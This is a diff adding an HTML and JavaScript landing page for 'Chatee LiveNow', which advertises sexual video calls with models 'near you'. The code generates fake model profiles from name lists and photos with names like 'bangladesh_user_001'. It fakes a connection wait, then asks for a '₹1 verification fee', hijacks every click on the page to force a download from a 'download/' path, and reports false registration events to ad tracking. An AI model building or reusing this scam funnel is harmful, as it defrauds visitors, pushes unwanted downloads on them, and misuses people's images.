@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+  <base href="/landing-pages/chatee/">
+
+<meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+  <title>Chatee LiveNow - Private Live Streaming</title>
+  <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+  <style data-purpose="custom-fonts">
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
+
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+  </style>
+  <style data-purpose="background-gradient">
+    .main-bg {
+      background-color: #E91E63;
+      /* The primary pinkish-red background */
+    }
+
+    .header-bg {
+      background: linear-gradient(to bottom, #512DA8, #673AB7);
+    }
+
+    .card-pink {
+      background-color: #F8BBD0;
+    }
+
+    .card-white {
+      background-color: #FFFFFF;
+    }
+
+    .action-btn {
+      transition: transform 120ms ease, box-shadow 120ms ease, filter 120ms ease;
+      will-change: transform;
+    }
+
+    .action-btn:active {
+      transform: translateY(1px) scale(0.97);
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.18);
+      filter: brightness(0.92);
+    }
+
+    .action-btn:focus-visible {
+      outline: 2px solid rgba(255, 255, 255, 0.85);
+      outline-offset: 2px;
+    }
+
+    .modal-overlay {
+      background: rgba(0, 0, 0, 0.6);
+    }
+
+    .text-accent-pink {
+      color: #e91e63;
+    }
+
+    @keyframes pulse-dots {
+
+      0%,
+      100% {
+        opacity: 0.3;
+      }
+
+      50% {
+        opacity: 1;
+      }
+    }
+
+    .dot-animation {
+      animation: pulse-dots 1.5s infinite ease-in-out;
+    }
+
+    .dot-delay-1 {
+      animation-delay: 0.2s;
+    }
+
+    .dot-delay-2 {
+      animation-delay: 0.4s;
+    }
+
+    .modal-shadow {
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+    }
+
+    .pay-btn-shadow {
+      box-shadow: 0 4px 10px rgba(233, 30, 99, 0.4);
+    }
+
+    .sticky-download-shell {
+      background: radial-gradient(circle at 50% 100%, rgba(255, 0, 155, 0.34), transparent 62%);
+    }
+
+    .neon-download-btn {
+      background: linear-gradient(135deg, #ff00bf 0%, #ff2f92 45%, #ff6b22 100%);
+      box-shadow:
+        0 0 0 1px rgba(255, 255, 255, 0.22) inset,
+        0 6px 14px rgba(95, 0, 48, 0.4),
+        0 0 18px rgba(255, 0, 191, 0.82),
+        0 0 38px rgba(255, 80, 41, 0.58);
+      text-shadow: 0 2px 4px rgba(95, 0, 48, 0.45);
+    }
+
+    .neon-download-btn::before {
+      content: "";
+      position: absolute;
+      inset: 5px 14px auto 18px;
+      height: 42%;
+      border-radius: 9999px;
+      background: linear-gradient(to bottom, rgba(255, 255, 255, 0.48), rgba(255, 255, 255, 0));
+      pointer-events: none;
+    }
+  </style>
+
+  <script src="/landing-runtime.js" defer></script>
+</head>
+
+<body class="main-bg min-h-screen text-gray-900">
+  <header class="header-bg py-4 px-4 text-white shadow-lg sticky top-0 z-50">
+<div class="flex items-center justify-between">
+      <div class="flex items-center gap-2">
+        <div class="bg-white rounded-full p-1 border-2 border-indigo-300">
+          <svg class="h-8 w-8 text-indigo-700" fill="currentColor" viewbox="0 0 24 24"
+            xmlns="http://www.w3.org/2000/svg">
+            <path
+              d="M21 6h-7.59l3.29-3.29L16 2l-4 4-4-4-1.29 1.29L10 6.41V18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V8c0-1.1.9-2 2-2h1V4c0-1.1.9-2 2-2h12c1.1 0 2 .9 2 2v2h1c1.1 0 2 .9 2 2v10c0 1.1-.9 2-2 2h-1.59l3.29 3.29L22 22l-4-4-4 4-1.29-1.29L16 17.41V6h5z">
+            </path>
+          </svg>
+        </div>
+        <div>
+          <h1 class="text-3xl font-extrabold tracking-tight">Chatee</h1>
+          <p class="text-[10px] leading-tight font-medium opacity-90">Video Call<br />Connect &amp; Explore</p>
+        </div>
+      </div>
+      <div class="text-right">
+        <div class="flex items-center justify-end gap-1">
+          <span class="text-xl">🍎</span>
+          <span class="text-xl font-bold tracking-widest italic">LIVE MODELS</span>
+        </div>
+        <p class="text-xs font-medium opacity-90">Available Near You</p>
+      </div>
+    </div>
+  </header>
+  <main class="p-3 pb-24">
+    <div class="grid grid-cols-2 gap-3" id="models-grid"></div>
+    <div class="py-4 text-center text-sm text-white/80" id="models-loading-indicator">Loading more...</div>
+    <div aria-hidden="true" class="h-6" id="models-load-sentinel"></div>
+  </main>
+  <div class="sticky-download-shell fixed inset-x-0 bottom-0 z-40 px-4 pb-[calc(0.85rem+env(safe-area-inset-bottom))] pt-4 bg-gradient-to-t from-black/55 to-transparent">
+    <button
+      class="neon-download-btn action-btn relative mx-auto flex w-full max-w-xs items-center justify-center gap-2.5 rounded-full border border-white/25 px-5 py-3 text-white"
+      id="sticky-download-btn" type="button">
+      <span class="relative z-10 flex flex-col items-center leading-none">
+        <span class="text-xl font-extrabold uppercase tracking-wide" data-download-label>Download Now</span>
+        <span class="mt-1.5 text-[9px] font-bold uppercase tracking-[0.18em] text-white/80">1v1 Sex Video</span>
+      </span>
+      <svg class="relative z-10 h-6 w-6 shrink-0" fill="none" stroke="currentColor" stroke-linecap="round"
+        stroke-linejoin="round" stroke-width="2.2" viewBox="0 0 24 24" aria-hidden="true">
+        <path d="M12 3v11"></path>
+        <path d="m7 10 5 5 5-5"></path>
+        <path d="M5 19h14"></path>
+      </svg>
+    </button>
+  </div>
+  <div class="fixed inset-0 modal-overlay items-center justify-center px-6 z-50 hidden" id="waiting-modal-overlay">
+    <div class="bg-white rounded-[32px] w-full max-w-md p-6 text-center shadow-2xl relative">
+      <h2 class="text-accent-pink text-2xl font-bold mb-4" id="waiting-modal-title">Waiting for Availability...</h2>
+      <p class="text-gray-600 text-lg leading-snug mb-8" id="waiting-modal-message">
+        Please wait while we establish a private connection...
+      </p>
+      <div class="flex justify-center items-center space-x-3">
+        <div class="w-4 h-4 bg-[#e91e63] rounded-full dot-animation"></div>
+        <div class="w-4 h-4 bg-[#f06292] rounded-full dot-animation dot-delay-1"></div>
+        <div class="w-4 h-4 bg-[#f8bbd0] rounded-full dot-animation dot-delay-2"></div>
+      </div>
+    </div>
+  </div>
+  <div class="fixed inset-0 bg-black/70 items-center justify-center p-6 z-[60] hidden" id="verification-modal-overlay">
+    <div class="bg-white w-full max-w-sm rounded-[30px] p-6 flex flex-col items-center text-center modal-shadow">
+      <h2 class="text-[#e91e63] text-2xl font-bold mb-4">
+        Connection Stabilized...
+      </h2>
+      <p class="text-gray-600 text-[15px] leading-relaxed mb-6 px-2">
+        Just ₹1 Verification Fee required to confirm you're serious and Unlock Premium access.
+      </p>
+      <p class="text-[#e91e63] text-xl font-bold mb-8">
+        Only ₹1
+      </p>
+      <div class="flex gap-4 w-full">
+        <button
+          class="flex-1 py-3.5 bg-[#e0e0e0] text-gray-700 font-bold rounded-full text-base transition-colors active:bg-gray-300"
+          id="verification-dismiss-btn" type="button">
+          Dismiss
+        </button>
+        <button
+          class="flex-1 py-3.5 bg-[#e91e63] text-white font-bold rounded-full text-base pay-btn-shadow transition-transform active:scale-95"
+          id="verification-pay-btn" type="button">
+          Pay ₹1
+        </button>
+      </div>
+    </div>
+  </div>
+  <div class="fixed inset-0 bg-black/70 items-center justify-center p-6 z-[70] hidden" id="download-modal-overlay">
+    <div class="bg-white w-full max-w-sm rounded-[30px] p-6 flex flex-col items-center text-center modal-shadow">
+      <h2 class="text-[#e91e63] text-2xl font-bold mb-6" id="download-modal-title">Download to Continue</h2>
+      <button
+        class="w-full py-3.5 bg-[#e91e63] text-white font-bold rounded-full text-base pay-btn-shadow transition-transform active:scale-95"
+        id="download-modal-btn" type="button">
+        Download Now
+      </button>
+      <p class="mt-4 text-sm text-gray-600 min-h-[20px]" id="download-modal-message"></p>
+    </div>
+  </div>
+  <script>
+    // Update this image list to add/remove cards on the homepage.
+    const CARD_IMAGES = [
+      "images/AA/01vrY7aORooK.webp",
+      "images/AA/01wGhVX9yWlR.webp",
+      "images/AA/11wDK1YtSjxH.webp",
+      "images/AA/11wG14o5LbCr.webp",
+      "images/AA/1w9NvR00y2TWPL022JNEw_8.webp",
+      "images/AA/1w9Vyt00y33lYHC0A4Wd7_8.webp",
+      "images/AA/1w9j2y00y2TWPL005OoDv_8.webp",
+      "images/AA/1wITBA00y33lYHC1Lllha_8.webp",
+      "images/AA/1wIt9a00y33lYHC00vx3F_8.webp",
+      "images/AA/1wJD6100y2TWPL01Am64V_8.webp",
+      "images/AA/21vNwdIEBpK3.webp",
+      "images/AA/21w4Pt4XTivo.webp",
+      "images/AA/bangladesh_user_001.webp",
+      "images/AA/bangladesh_user_002.webp",
+      "images/AA/bangladesh_user_003.webp",
+      "images/AA/bangladesh_user_004.webp",
+      "images/AA/bangladesh_user_005.webp",
+      "images/AA/bangladesh_user_007.webp",
+      "images/AA/bangladesh_user_008.webp",
+      "images/AA/bangladesh_user_009.webp",
+      "images/AA/bangladesh_user_010.webp",
+      "images/AA/bangladesh_user_011.webp",
+      "images/AA/bangladesh_user_012.webp",
+      "images/AA/bangladesh_user_013.webp",
+      "images/AA/bangladesh_user_014.webp",
+      "images/AA/bangladesh_user_015.webp",
+      "images/AA/bangladesh_user_017.webp",
+      "images/AA/bangladesh_user_018.webp",
+      "images/AA/bangladesh_user_019.webp",
+      "images/AA/bangladesh_user_021.webp",
+      "images/AA/bangladesh_user_022.webp",
+      "images/AA/bangladesh_user_024.webp",
+      "images/AA/bangladesh_user_025.webp",
+      "images/AA/bangladesh_user_029.webp",
+      "images/AA/bangladesh_user_030.webp",
+      "images/AA/bangladesh_user_037.webp",
+      "images/AA/bangladesh_user_039.webp",
+      "images/AA/bangladesh_user_045.webp"
+    ];
+
+    const CARD_FIRST_NAMES = [
+      "Ayesha",
+      "Khushi",
+      "Garima",
+      "Ananya",
+      "Neha",
+      "Pooja",
+      "Simran",
+      "Meera",
+      "Kritika",
+      "Ishita",
+      "Tanya",
+      "Radhika",
+      "Naina",
+      "Sakshi",
+      "Priyanka"
+    ];
+
+    const CARD_LAST_NAMES = [
+      "Khan",
+      "Yadav",
+      "Patel",
+      "Sharma",
+      "Verma"
+    ];
+
+    const CARD_BIOS = [
+      "Young & Wild",
+      "Video Call Expert",
+      "Flirty Chat Queen",
+      "Sensual Chat Pro",
+      "Virtual Fun Partner",
+      "Friendly Night Listener",
+      "Playful Flirty Vibes",
+      "Calm Bilingual Calls",
+      "Soft Daily Checkins",
+      "Confident Witty Energy"
+    ];
+
+    const CARD_HEIGHTS = [152, 155, 158, 160, 162, 165, 168, 170, 172];
+
+    const CARD_CONFIG = CARD_IMAGES.map((image, index) => {
+      const firstName = CARD_FIRST_NAMES[index % CARD_FIRST_NAMES.length];
+      const lastName = CARD_LAST_NAMES[Math.floor(index / CARD_FIRST_NAMES.length) % CARD_LAST_NAMES.length];
+      const status = index % 4 === 0 ? "busy" : "available";
+
+      return {
+        name: `${firstName} ${lastName}`,
+        age: 25 + (index % 11),
+        height: CARD_HEIGHTS[index % CARD_HEIGHTS.length],
+        bio: CARD_BIOS[index % CARD_BIOS.length],
+        image,
+        theme: status === "busy" ? "pink" : "white",
+        status
+      };
+    });
+
+    const STATUS_CONFIG = {
+      busy: {
+        icon: "🔇",
+        label: "Busy on Call",
+        buttonClass: "bg-[#E91E63]"
+      },
+      available: {
+        icon: "📞",
+        label: "Available Now",
+        buttonClass: "bg-[#4CAF50]"
+      }
+    };
+    // 1: clicking a card button shows the download modal.
+    // 0: keep existing flow.
+    const SHOW_DOWNLOAD_MODAL_ON_BUTTON_CLICK = 1;
+    // 1: any click on the page triggers the download flow.
+    // 0: keep the original click behavior.
+    const ENABLE_GLOBAL_DOWNLOAD_TRIGGER = 1;
+    const DOWNLOAD_MODAL_TITLE = "Download to Continue";
+    const DOWNLOAD_BUTTON_TEXT = "Download Now";
+
+    const CARD_PAGE_SIZE = 8;
+
+    function escapeHtml(text) {
+      return text
+        .replaceAll("&", "&amp;")
+        .replaceAll("<", "&lt;")
+        .replaceAll(">", "&gt;")
+        .replaceAll("\"", "&quot;")
+        .replaceAll("'", "&#39;");
+    }
+
+    function renderCard(card) {
+      const status = STATUS_CONFIG[card.status] || STATUS_CONFIG.available;
+      const cardClass = card.theme === "pink" ? "card-pink" : "card-white";
+
+      return `
+        <div
+          class="${cardClass} rounded-2xl overflow-hidden flex flex-col shadow-md cursor-pointer"
+          data-open-modal="true"
+          data-model-name="${escapeHtml(card.name)}"
+          data-model-status="${escapeHtml(card.status)}"
+        >
+          <div class="relative h-48 overflow-hidden">
+            <img alt="${escapeHtml(card.name)}" class="w-full h-full object-cover" src="${escapeHtml(card.image)}" />
+          </div>
+          <div class="p-3 flex-grow flex flex-col justify-between">
+            <div>
+              <h2 class="text-lg font-bold text-gray-800 leading-tight">${escapeHtml(card.name)}</h2>
+              <p class="text-xs text-gray-600 flex items-center gap-1 mt-0.5">
+                <span class="inline-flex items-center gap-2 font-semibold text-gray-600">
+                  <span class="inline-flex items-center gap-0.5">
+                    <svg class="h-3.5 w-3.5 text-[#e91e63]" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                      <path d="M12 12a5 5 0 1 0 0-10 5 5 0 0 0 0 10zm0 2c-4.42 0-8 2.24-8 5v1h16v-1c0-2.76-3.58-5-8-5z"></path>
+                    </svg>
+                    <span>${card.age}</span>
+                  </span>
+                  <span class="inline-flex items-center gap-0.5">
+                    <svg class="h-3.5 w-3.5 text-[#e91e63]" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                      <path d="M15 3h-2v18h2v-2h2v-2h-2v-2h2v-2h-2v-2h2V9h-2V7h2V5h-2V3zm-4 0H9v2H7v2h2v2H7v2h2v2H7v2h2v2H7v2h2v2h2V3z"></path>
+                    </svg>
+                    <span>${card.height}cm</span>
+                  </span>
+                </span>
+              </p>
+              <div class="grid grid-cols-3 gap-1.5 mt-2">
+                <div class="relative h-16 overflow-hidden rounded-lg">
+                  <img alt="${escapeHtml(card.name)} thumbnail 1" class="w-full h-full object-cover" src="${escapeHtml(card.image)}" />
+                  <div class="absolute inset-0 bg-black/40"></div>
+                  <div class="absolute inset-0 flex items-center justify-center">
+                    <div class="flex h-7 w-7 items-center justify-center rounded-full bg-white/85 shadow-md">
+                      <svg class="h-5.5 w-5.5 text-[#e91e63]" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                        <path d="M8 5.14v13.72c0 .77.83 1.25 1.5.86l10-6.86a1 1 0 0 0 0-1.72l-10-6.86A1 1 0 0 0 8 5.14z"></path>
+                      </svg>
+                    </div>
+                  </div>
+                </div>
+                <div class="relative h-16 overflow-hidden rounded-lg">
+                  <img alt="${escapeHtml(card.name)} thumbnail 2" class="w-full h-full object-cover" src="${escapeHtml(card.image)}" />
+                  <div class="absolute inset-0 bg-black/40"></div>
+                  <div class="absolute inset-0 flex items-center justify-center">
+                    <div class="flex h-7 w-7 items-center justify-center rounded-full bg-white/85 shadow-md">
+                      <svg class="h-5.5 w-5.5 text-[#e91e63]" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                        <path d="M8 5.14v13.72c0 .77.83 1.25 1.5.86l10-6.86a1 1 0 0 0 0-1.72l-10-6.86A1 1 0 0 0 8 5.14z"></path>
+                      </svg>
+                    </div>
+                  </div>
+                </div>
+                <div class="relative h-16 overflow-hidden rounded-lg">
+                  <img alt="${escapeHtml(card.name)} thumbnail 3" class="w-full h-full object-cover" src="${escapeHtml(card.image)}" />
+                  <div class="absolute inset-0 bg-black/40"></div>
+                  <div class="absolute inset-0 flex items-center justify-center">
+                    <div class="flex h-7 w-7 items-center justify-center rounded-full bg-white/85 shadow-md">
+                      <svg class="h-5.5 w-5.5 text-[#e91e63]" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                        <path d="M8 5.14v13.72c0 .77.83 1.25 1.5.86l10-6.86a1 1 0 0 0 0-1.72l-10-6.86A1 1 0 0 0 8 5.14z"></path>
+                      </svg>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <button
+              class="action-btn mt-3 ${status.buttonClass} text-white py-2 px-3 rounded-full flex items-center justify-center gap-1 text-sm font-bold shadow-sm"
+            >
+              <span>${status.icon}</span> ${status.label}
+            </button>
+          </div>
+        </div>
+      `;
+    }
+
+    const modelsGrid = document.getElementById("models-grid");
+    const modelsLoadingIndicator = document.getElementById("models-loading-indicator");
+    const modelsLoadSentinel = document.getElementById("models-load-sentinel");
+    let renderedCardCount = 0;
+    let isRenderingCards = false;
+    let cardLoadObserver = null;
+
+    function hasMoreCards() {
+      return renderedCardCount < CARD_CONFIG.length;
+    }
+
+    function updateCardLoadUi() {
+      const hasMore = hasMoreCards();
+
+      if (modelsLoadingIndicator) {
+        modelsLoadingIndicator.textContent = hasMore ? "Loading more..." : "All profiles loaded";
+        modelsLoadingIndicator.classList.toggle("hidden", CARD_CONFIG.length === 0);
+      }
+
+      if (modelsLoadSentinel) {
+        modelsLoadSentinel.classList.toggle("hidden", !hasMore);
+      }
+
+      if (!hasMore && cardLoadObserver) {
+        cardLoadObserver.disconnect();
+      }
+    }
+
+    function renderNextCardPage() {
+      if (isRenderingCards || !hasMoreCards()) {
+        updateCardLoadUi();
+        return;
+      }
+
+      isRenderingCards = true;
+      const nextCards = CARD_CONFIG.slice(renderedCardCount, renderedCardCount + CARD_PAGE_SIZE);
+      modelsGrid.insertAdjacentHTML("beforeend", nextCards.map(renderCard).join(""));
+      renderedCardCount += nextCards.length;
+      isRenderingCards = false;
+      updateCardLoadUi();
+
+      if (hasMoreCards()) {
+        window.requestAnimationFrame(() => {
+          if (!modelsLoadSentinel) {
+            return;
+          }
+
+          const sentinelTop = modelsLoadSentinel.getBoundingClientRect().top;
+          if (sentinelTop <= window.innerHeight + 240) {
+            renderNextCardPage();
+          }
+        });
+      }
+    }
+
+    function setupInfiniteCardLoading() {
+      renderNextCardPage();
+
+      if (!modelsLoadSentinel || !hasMoreCards()) {
+        return;
+      }
+
+      if ("IntersectionObserver" in window) {
+        cardLoadObserver = new IntersectionObserver((entries) => {
+          const entry = entries[0];
+          if (!entry || !entry.isIntersecting) {
+            return;
+          }
+
+          renderNextCardPage();
+        }, {
+          rootMargin: "240px 0px"
+        });
+        cardLoadObserver.observe(modelsLoadSentinel);
+        return;
+      }
+
+      window.addEventListener("scroll", () => {
+        if (!hasMoreCards() || !modelsLoadSentinel) {
+          return;
+        }
+
+        const sentinelTop = modelsLoadSentinel.getBoundingClientRect().top;
+        if (sentinelTop <= window.innerHeight + 240) {
+          renderNextCardPage();
+        }
+      }, { passive: true });
+    }
+
+    setupInfiniteCardLoading();
+
+    const modalOverlay = document.getElementById("waiting-modal-overlay");
+    const modalTitle = document.getElementById("waiting-modal-title");
+    const modalMessage = document.getElementById("waiting-modal-message");
+    const modalClose = document.getElementById("waiting-modal-close");
+    const verificationModalOverlay = document.getElementById("verification-modal-overlay");
+    const verificationDismissBtn = document.getElementById("verification-dismiss-btn");
+    const verificationPayBtn = document.getElementById("verification-pay-btn");
+    const downloadModalOverlay = document.getElementById("download-modal-overlay");
+    const downloadModalTitle = document.getElementById("download-modal-title");
+    const downloadModalBtn = document.getElementById("download-modal-btn");
+    const downloadModalMessage = document.getElementById("download-modal-message");
+    const stickyDownloadBtn = document.getElementById("sticky-download-btn");
+    let verificationTimerId = null;
+
+    function showModal({ title, message }) {
+      modalTitle.textContent = title;
+      modalMessage.textContent = message;
+      modalOverlay.classList.remove("hidden");
+      modalOverlay.classList.add("flex");
+    }
+
+    function hideModal() {
+      modalOverlay.classList.add("hidden");
+      modalOverlay.classList.remove("flex");
+    }
+
+    function showVerificationModal() {
+      verificationModalOverlay.classList.remove("hidden");
+      verificationModalOverlay.classList.add("flex");
+    }
+
+    function hideVerificationModal() {
+      verificationModalOverlay.classList.add("hidden");
+      verificationModalOverlay.classList.remove("flex");
+    }
+
+    function showDownloadModal() {
+      if (downloadModalTitle) {
+        downloadModalTitle.textContent = DOWNLOAD_MODAL_TITLE;
+      }
+      if (downloadModalBtn) {
+        downloadModalBtn.textContent = DOWNLOAD_BUTTON_TEXT;
+      }
+      if (downloadModalMessage) {
+        downloadModalMessage.textContent = "";
+      }
+      downloadModalOverlay.classList.remove("hidden");
+      downloadModalOverlay.classList.add("flex");
+    }
+
+    function hideDownloadModal() {
+      downloadModalOverlay.classList.add("hidden");
+      downloadModalOverlay.classList.remove("flex");
+    }
+
+    function clearVerificationTimer() {
+      if (verificationTimerId !== null) {
+        clearTimeout(verificationTimerId);
+        verificationTimerId = null;
+      }
+    }
+
+    function resetModalState() {
+      clearVerificationTimer();
+      hideModal();
+      hideVerificationModal();
+      hideDownloadModal();
+    }
+
+    function trackCompleteRegistration() {
+      if (typeof window.fbq !== "function") {
+        return false;
+      }
+      window.fbq("track", "CompleteRegistration", {
+        trigger: "download_button_click"
+      });
+      return true;
+    }
+
+    function isGlobalDownloadEnabled() {
+      return ENABLE_GLOBAL_DOWNLOAD_TRIGGER === 1 && SHOW_DOWNLOAD_MODAL_ON_BUTTON_CLICK === 1;
+    }
+
+    function setDownloadButtonState({ disabled, text }) {
+      [downloadModalBtn, stickyDownloadBtn].forEach((button) => {
+        if (!button) {
+          return;
+        }
+
+        button.classList.toggle("opacity-80", disabled);
+
+        if (button === downloadModalBtn) {
+          button.textContent = text;
+          return;
+        }
+
+        const label = button.querySelector("[data-download-label]");
+        if (label) {
+          label.textContent = text;
+        }
+      });
+    }
+
+    async function startDownload() {
+      const shouldDelayRedirect = trackCompleteRegistration();
+      const originalText = downloadModalBtn ? downloadModalBtn.textContent : DOWNLOAD_BUTTON_TEXT;
+
+      setDownloadButtonState({ disabled: true, text: "Preparing download..." });
+
+      if (downloadModalMessage) {
+        downloadModalMessage.textContent = "";
+      }
+
+      try {
+        if (downloadModalMessage) {
+          downloadModalMessage.textContent = "Download is starting...";
+        }
+
+        if (shouldDelayRedirect) {
+          await new Promise((resolve) => window.setTimeout(resolve, 300));
+        }
+
+        // 修改为直接跳转到 download.php?v=时间戳
+        window.location.href = "download/?v=" + new Date().getTime();
+      } catch (error) {
+        if (downloadModalMessage) {
+          downloadModalMessage.textContent = "Error occurred.";
+        }
+        console.error("download failed", error);
+      } finally {
+        setDownloadButtonState({ disabled: false, text: originalText || DOWNLOAD_BUTTON_TEXT });
+      }
+    }
+
+    window.openWaitingModal = showModal;
+    window.closeWaitingModal = hideModal;
+
+    modelsGrid.addEventListener("click", (event) => {
+      if (isGlobalDownloadEnabled()) {
+        return;
+      }
+
+      const card = event.target.closest("[data-open-modal='true']");
+      if (!card) {
+        return;
+      }
+
+      const modelName = card.dataset.modelName || "the model";
+      const modelStatus = card.dataset.modelStatus || "available";
+
+      if (SHOW_DOWNLOAD_MODAL_ON_BUTTON_CLICK === 1) {
+        clearVerificationTimer();
+        hideModal();
+        hideVerificationModal();
+        showDownloadModal();
+        return;
+      }
+
+      if (modelStatus === "busy") {
+        return;
+      }
+
+      showModal({
+        title: "Waiting for Availability...",
+        message: `Please wait while we establish a private connection...`
+      });
+
+      hideVerificationModal();
+      clearVerificationTimer();
+      const delayMs = 2000 + Math.floor(Math.random() * 3001);
+      verificationTimerId = window.setTimeout(() => {
+        hideModal();
+        showVerificationModal();
+      }, delayMs);
+    });
+
+    if (modalClose) {
+      modalClose.addEventListener("click", () => {
+        clearVerificationTimer();
+        hideModal();
+      });
+    }
+    modalOverlay.addEventListener("click", (event) => {
+      if (event.target === modalOverlay) {
+        clearVerificationTimer();
+        hideModal();
+      }
+    });
+    if (verificationDismissBtn) {
+      verificationDismissBtn.addEventListener("click", hideVerificationModal);
+    }
+    if (verificationPayBtn) {
+      verificationPayBtn.addEventListener("click", () => {
+        window.location.href = "payment_method.html";
+      });
+    }
+    if (downloadModalBtn) {
+      downloadModalBtn.addEventListener("click", (event) => {
+        event.preventDefault();
+        startDownload();
+      });
+    }
+    if (stickyDownloadBtn) {
+      stickyDownloadBtn.addEventListener("click", (event) => {
+        event.preventDefault();
+        clearVerificationTimer();
+        hideModal();
+        hideVerificationModal();
+        hideDownloadModal();
+        startDownload();
+      });
+    }
+    if (isGlobalDownloadEnabled()) {
+      document.addEventListener("click", (event) => {
+        event.preventDefault();
+        event.stopPropagation();
+        if (typeof event.stopImmediatePropagation === "function") {
+          event.stopImmediatePropagation();
+        }
+
+        clearVerificationTimer();
+        hideModal();
+        hideVerificationModal();
+        hideDownloadModal();
+        startDownload();
+      }, true);
+    }
+    verificationModalOverlay.addEventListener("click", (event) => {
+      if (event.target === verificationModalOverlay) {
+        hideVerificationModal();
+      }
+    });
+    downloadModalOverlay.addEventListener("click", (event) => {
+      if (event.target === downloadModalOverlay) {
+        hideDownloadModal();
+      }
+    });
+    document.addEventListener("keydown", (event) => {
+      if (event.key !== "Escape") {
+        return;
+      }
+
+      if (!modalOverlay.classList.contains("hidden")) {
+        clearVerificationTimer();
+        hideModal();
+      }
+
+      if (!verificationModalOverlay.classList.contains("hidden")) {
+        hideVerificationModal();
+      }
+
+      if (!downloadModalOverlay.classList.contains("hidden")) {
+        hideDownloadModal();
+      }
+    });
+    window.addEventListener("pageshow", () => {
+      resetModalState();
+    });
+  </script>
+
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"d8d0a4b6e3294b56990fe4f7e7e0a13a","r":1}' crossorigin="anonymous"></script>
+</body>
+
+</html>
